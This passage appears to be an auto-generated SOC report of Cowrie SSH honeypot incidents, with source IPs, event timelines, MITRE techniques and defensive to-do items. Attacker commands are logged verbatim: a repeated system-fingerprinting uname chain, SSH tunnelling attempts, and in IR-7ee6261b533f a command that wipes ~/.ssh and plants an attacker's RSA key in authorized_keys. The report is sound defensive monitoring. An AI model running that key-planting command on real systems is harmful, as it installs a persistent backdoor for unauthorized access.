| `2026-07-21 19:28:10` | `cowrie.command.input` |
| `2026-07-21 19:28:10` | `cowrie.command.input` |
| `2026-07-21 19:28:10` | `cowrie.command.input` |
| `2026-07-21 19:28:10` | `cowrie.command.input` |
| `2026-07-21 19:28:10` | `cowrie.log.closed` |
| `2026-07-21 19:28:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03b6fa4a20d4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:29 |
| **Last Seen** | 2026-07-21 19:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:29:57` | `cowrie.session.connect` |
| `2026-07-21 19:29:57` | `cowrie.client.version` |
| `2026-07-21 19:29:57` | `cowrie.client.kex` |
| `2026-07-21 19:30:01` | `cowrie.login.success` |
| `2026-07-21 19:30:02` | `cowrie.session.params` |
| `2026-07-21 19:30:02` | `cowrie.command.input` |
| `2026-07-21 19:30:02` | `cowrie.command.input` |
| `2026-07-21 19:30:02` | `cowrie.command.input` |
| `2026-07-21 19:30:02` | `cowrie.command.input` |
| `2026-07-21 19:30:02` | `cowrie.command.input` |
| `2026-07-21 19:30:02` | `cowrie.command.success` |
| `2026-07-21 19:30:02` | `cowrie.command.input` |
| `2026-07-21 19:30:02` | `cowrie.command.input` |
| `2026-07-21 19:30:02` | `cowrie.command.input` |
| `2026-07-21 19:30:02` | `cowrie.command.input` |
| `2026-07-21 19:30:03` | `cowrie.log.closed` |
| `2026-07-21 19:30:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-423403b3f169

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:31 |
| **Last Seen** | 2026-07-21 19:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:31:44` | `cowrie.session.connect` |
| `2026-07-21 19:31:45` | `cowrie.client.version` |
| `2026-07-21 19:31:45` | `cowrie.client.kex` |
| `2026-07-21 19:31:47` | `cowrie.login.success` |
| `2026-07-21 19:31:48` | `cowrie.session.params` |
| `2026-07-21 19:31:48` | `cowrie.command.input` |
| `2026-07-21 19:31:48` | `cowrie.command.input` |
| `2026-07-21 19:31:48` | `cowrie.command.input` |
| `2026-07-21 19:31:48` | `cowrie.command.input` |
| `2026-07-21 19:31:48` | `cowrie.command.input` |
| `2026-07-21 19:31:48` | `cowrie.command.success` |
| `2026-07-21 19:31:48` | `cowrie.command.input` |
| `2026-07-21 19:31:48` | `cowrie.command.input` |
| `2026-07-21 19:31:48` | `cowrie.command.input` |
| `2026-07-21 19:31:48` | `cowrie.command.input` |
| `2026-07-21 19:31:49` | `cowrie.log.closed` |
| `2026-07-21 19:31:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cfd5931807f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:33 |
| **Last Seen** | 2026-07-21 19:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:33:33` | `cowrie.session.connect` |
| `2026-07-21 19:33:33` | `cowrie.client.version` |
| `2026-07-21 19:33:33` | `cowrie.client.kex` |
| `2026-07-21 19:33:35` | `cowrie.login.success` |
| `2026-07-21 19:33:36` | `cowrie.session.params` |
| `2026-07-21 19:33:36` | `cowrie.command.input` |
| `2026-07-21 19:33:36` | `cowrie.command.input` |
| `2026-07-21 19:33:36` | `cowrie.command.input` |
| `2026-07-21 19:33:36` | `cowrie.command.input` |
| `2026-07-21 19:33:36` | `cowrie.command.input` |
| `2026-07-21 19:33:36` | `cowrie.command.success` |
| `2026-07-21 19:33:36` | `cowrie.command.input` |
| `2026-07-21 19:33:36` | `cowrie.command.input` |
| `2026-07-21 19:33:36` | `cowrie.command.input` |
| `2026-07-21 19:33:36` | `cowrie.command.input` |
| `2026-07-21 19:33:37` | `cowrie.log.closed` |
| `2026-07-21 19:33:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f37a00c968a6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:35 |
| **Last Seen** | 2026-07-21 19:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:35:12` | `cowrie.session.connect` |
| `2026-07-21 19:35:12` | `cowrie.client.version` |
| `2026-07-21 19:35:12` | `cowrie.client.kex` |
| `2026-07-21 19:35:14` | `cowrie.login.success` |
| `2026-07-21 19:35:15` | `cowrie.session.params` |
| `2026-07-21 19:35:15` | `cowrie.command.input` |
| `2026-07-21 19:35:15` | `cowrie.command.input` |
| `2026-07-21 19:35:15` | `cowrie.command.input` |
| `2026-07-21 19:35:15` | `cowrie.command.input` |
| `2026-07-21 19:35:15` | `cowrie.command.input` |
| `2026-07-21 19:35:15` | `cowrie.command.success` |
| `2026-07-21 19:35:15` | `cowrie.command.input` |
| `2026-07-21 19:35:15` | `cowrie.command.input` |
| `2026-07-21 19:35:15` | `cowrie.command.input` |
| `2026-07-21 19:35:15` | `cowrie.command.input` |
| `2026-07-21 19:35:15` | `cowrie.log.closed` |
| `2026-07-21 19:35:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84dda4e519d1

| Field | Detail |
|---|---|
| **Source IP** | `111.171.125[.]94` |
| **First Seen** | 2026-07-21 19:35 |
| **Last Seen** | 2026-07-21 19:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:35:28` | `cowrie.session.connect` |
| `2026-07-21 19:35:29` | `cowrie.client.version` |
| `2026-07-21 19:35:29` | `cowrie.client.kex` |
| `2026-07-21 19:35:31` | `cowrie.login.success` |
| `2026-07-21 19:35:32` | `cowrie.direct-tcpip.request` |
| `2026-07-21 19:35:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.125[.]94` to AbuseIPDB if not already reported
- [ ] Block `111.171.125[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2120ef39c2d7

| Field | Detail |
|---|---|
| **Source IP** | `182.60.128[.]241` |
| **First Seen** | 2026-07-21 19:35 |
| **Last Seen** | 2026-07-21 19:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:35:37` | `cowrie.session.connect` |
| `2026-07-21 19:35:38` | `cowrie.client.version` |
| `2026-07-21 19:35:38` | `cowrie.client.kex` |
| `2026-07-21 19:35:40` | `cowrie.login.success` |
| `2026-07-21 19:35:41` | `cowrie.direct-tcpip.request` |
| `2026-07-21 19:35:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.60.128[.]241` to AbuseIPDB if not already reported
- [ ] Block `182.60.128[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ee6261b533f

| Field | Detail |
|---|---|
| **Source IP** | `134.122.125[.]41` |
| **First Seen** | 2026-07-21 19:36 |
| **Last Seen** | 2026-07-21 19:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:36:15` | `cowrie.session.connect` |
| `2026-07-21 19:36:15` | `cowrie.client.version` |
| `2026-07-21 19:36:15` | `cowrie.client.kex` |
| `2026-07-21 19:36:15` | `cowrie.login.success` |
| `2026-07-21 19:36:16` | `cowrie.session.params` |
| `2026-07-21 19:36:16` | `cowrie.command.input` |
| `2026-07-21 19:36:16` | `cowrie.command.failed` |
| `2026-07-21 19:36:16` | `cowrie.log.closed` |
| `2026-07-21 19:36:17` | `cowrie.session.params` |
| `2026-07-21 19:36:17` | `cowrie.command.input` |
| `2026-07-21 19:36:17` | `cowrie.session.file_download` |
| `2026-07-21 19:36:17` | `cowrie.log.closed` |
| `2026-07-21 19:36:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.125[.]41` to AbuseIPDB if not already reported
- [ ] Block `134.122.125[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9782f06c320

| Field | Detail |
|---|---|
| **Source IP** | `134.122.125[.]41` |
| **First Seen** | 2026-07-21 19:36 |
| **Last Seen** | 2026-07-21 19:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:36:17` | `cowrie.session.connect` |
| `2026-07-21 19:36:17` | `cowrie.client.version` |
| `2026-07-21 19:36:17` | `cowrie.client.kex` |
| `2026-07-21 19:36:17` | `cowrie.login.success` |
| `2026-07-21 19:36:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.125[.]41` to AbuseIPDB if not already reported
- [ ] Block `134.122.125[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2760d47480df

| Field | Detail |
|---|---|
| **Source IP** | `134.122.125[.]41` |
| **First Seen** | 2026-07-21 19:36 |
| **Last Seen** | 2026-07-21 19:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:36:17` | `cowrie.session.connect` |
| `2026-07-21 19:36:17` | `cowrie.client.version` |
| `2026-07-21 19:36:17` | `cowrie.client.kex` |
| `2026-07-21 19:36:17` | `cowrie.login.success` |
| `2026-07-21 19:36:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.125[.]41` to AbuseIPDB if not already reported
- [ ] Block `134.122.125[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c97abec1b6b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:37 |
| **Last Seen** | 2026-07-21 19:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:37:06` | `cowrie.session.connect` |
| `2026-07-21 19:37:06` | `cowrie.client.version` |
| `2026-07-21 19:37:06` | `cowrie.client.kex` |
| `2026-07-21 19:37:10` | `cowrie.login.success` |
| `2026-07-21 19:37:12` | `cowrie.session.params` |
| `2026-07-21 19:37:12` | `cowrie.command.input` |
| `2026-07-21 19:37:12` | `cowrie.command.input` |
| `2026-07-21 19:37:12` | `cowrie.command.input` |
| `2026-07-21 19:37:12` | `cowrie.command.input` |
| `2026-07-21 19:37:12` | `cowrie.command.input` |
| `2026-07-21 19:37:12` | `cowrie.command.success` |
| `2026-07-21 19:37:12` | `cowrie.command.input` |
| `2026-07-21 19:37:12` | `cowrie.command.input` |
| `2026-07-21 19:37:12` | `cowrie.command.input` |
| `2026-07-21 19:37:12` | `cowrie.command.input` |
| `2026-07-21 19:37:13` | `cowrie.log.closed` |
| `2026-07-21 19:37:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1e5197f11ac

| Field | Detail |
|---|---|
| **Source IP** | `95.165.142[.]8` |
| **First Seen** | 2026-07-21 19:38 |
| **Last Seen** | 2026-07-21 19:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:38:13` | `cowrie.session.connect` |
| `2026-07-21 19:38:13` | `cowrie.client.version` |
| `2026-07-21 19:38:13` | `cowrie.client.kex` |
| `2026-07-21 19:38:14` | `cowrie.login.success` |
| `2026-07-21 19:38:14` | `cowrie.direct-tcpip.request` |
| `2026-07-21 19:38:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.165.142[.]8` to AbuseIPDB if not already reported
- [ ] Block `95.165.142[.]8` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3076b2df01a

| Field | Detail |
|---|---|
| **Source IP** | `210.245.95[.]11` |
| **First Seen** | 2026-07-21 19:38 |
| **Last Seen** | 2026-07-21 19:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:38:31` | `cowrie.session.connect` |
| `2026-07-21 19:38:32` | `cowrie.client.version` |
| `2026-07-21 19:38:32` | `cowrie.client.kex` |
| `2026-07-21 19:38:33` | `cowrie.login.success` |
| `2026-07-21 19:38:34` | `cowrie.direct-tcpip.request` |
| `2026-07-21 19:38:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.245.95[.]11` to AbuseIPDB if not already reported
- [ ] Block `210.245.95[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-179058e8f204

| Field | Detail |
|---|---|
| **Source IP** | `195.158.26[.]59` |
| **First Seen** | 2026-07-21 19:38 |
| **Last Seen** | 2026-07-21 19:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:38:39` | `cowrie.session.connect` |
| `2026-07-21 19:38:40` | `cowrie.client.version` |
| `2026-07-21 19:38:40` | `cowrie.client.kex` |
| `2026-07-21 19:38:42` | `cowrie.login.success` |
| `2026-07-21 19:38:43` | `cowrie.direct-tcpip.request` |
| `2026-07-21 19:38:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.158.26[.]59` to AbuseIPDB if not already reported
- [ ] Block `195.158.26[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2451c2e8023

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:38 |
| **Last Seen** | 2026-07-21 19:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:38:57` | `cowrie.session.connect` |
| `2026-07-21 19:38:57` | `cowrie.client.version` |
| `2026-07-21 19:38:57` | `cowrie.client.kex` |
| `2026-07-21 19:38:59` | `cowrie.login.success` |
| `2026-07-21 19:39:01` | `cowrie.session.params` |
| `2026-07-21 19:39:01` | `cowrie.command.input` |
| `2026-07-21 19:39:01` | `cowrie.command.input` |
| `2026-07-21 19:39:01` | `cowrie.command.input` |
| `2026-07-21 19:39:01` | `cowrie.command.input` |
| `2026-07-21 19:39:01` | `cowrie.command.input` |
| `2026-07-21 19:39:01` | `cowrie.command.success` |
| `2026-07-21 19:39:01` | `cowrie.command.input` |
| `2026-07-21 19:39:01` | `cowrie.command.input` |
| `2026-07-21 19:39:01` | `cowrie.command.input` |
| `2026-07-21 19:39:01` | `cowrie.command.input` |
| `2026-07-21 19:39:01` | `cowrie.log.closed` |
| `2026-07-21 19:39:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-846efef2ddd9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:40 |
| **Last Seen** | 2026-07-21 19:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:40:45` | `cowrie.session.connect` |
| `2026-07-21 19:40:45` | `cowrie.client.version` |
| `2026-07-21 19:40:45` | `cowrie.client.kex` |
| `2026-07-21 19:40:47` | `cowrie.login.success` |
| `2026-07-21 19:40:48` | `cowrie.session.params` |
| `2026-07-21 19:40:48` | `cowrie.command.input` |
| `2026-07-21 19:40:48` | `cowrie.command.input` |
| `2026-07-21 19:40:48` | `cowrie.command.input` |
| `2026-07-21 19:40:48` | `cowrie.command.input` |
| `2026-07-21 19:40:48` | `cowrie.command.input` |
| `2026-07-21 19:40:48` | `cowrie.command.success` |
| `2026-07-21 19:40:48` | `cowrie.command.input` |
| `2026-07-21 19:40:48` | `cowrie.command.input` |
| `2026-07-21 19:40:48` | `cowrie.command.input` |
| `2026-07-21 19:40:48` | `cowrie.command.input` |
| `2026-07-21 19:40:49` | `cowrie.log.closed` |
| `2026-07-21 19:40:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9adbd61e2860

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:42 |
| **Last Seen** | 2026-07-21 19:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:42:25` | `cowrie.session.connect` |
| `2026-07-21 19:42:26` | `cowrie.client.version` |
| `2026-07-21 19:42:26` | `cowrie.client.kex` |
| `2026-07-21 19:42:28` | `cowrie.login.success` |
| `2026-07-21 19:42:30` | `cowrie.session.params` |
| `2026-07-21 19:42:30` | `cowrie.command.input` |
| `2026-07-21 19:42:30` | `cowrie.command.input` |
| `2026-07-21 19:42:30` | `cowrie.command.input` |
| `2026-07-21 19:42:30` | `cowrie.command.input` |
